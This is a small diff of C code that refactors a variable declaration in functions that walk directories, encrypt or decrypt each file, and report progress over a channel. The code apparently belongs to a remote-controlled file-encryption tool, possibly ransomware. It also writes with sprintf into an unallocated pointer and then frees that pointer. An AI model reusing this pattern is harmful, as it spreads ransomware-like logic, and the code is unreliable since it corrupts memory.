@@ -60,9 +60,7 @@ int begin_encrypt(int channel, char *path, char *key, char *iv)
 
                 free(newName);
             } else {
-                char *process;
                 sprintf(process, "Encrypting %s\n", dir->d_name);
-
                 send_channel(channel, process);
                 free(process);
             }
@@ -81,7 +79,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
     if (dr == NULL)
         return 0;
 
-    char *newName, *toVisit;
+    char *newName, *toVisit, *process;
     FILE *old, *newone;
 
     while ((dir = readdir(dr)) != NULL) {
@@ -100,9 +98,7 @@ int begin_decrypt(int channel, char *path, char *key, char *iv)
 
                 free(newName);
             } else {
-                char *process;
                 sprintf(process, "Decrypting %s\n", dir->d_name);
-
                 send_channel(channel, process);
                 free(process);
             }
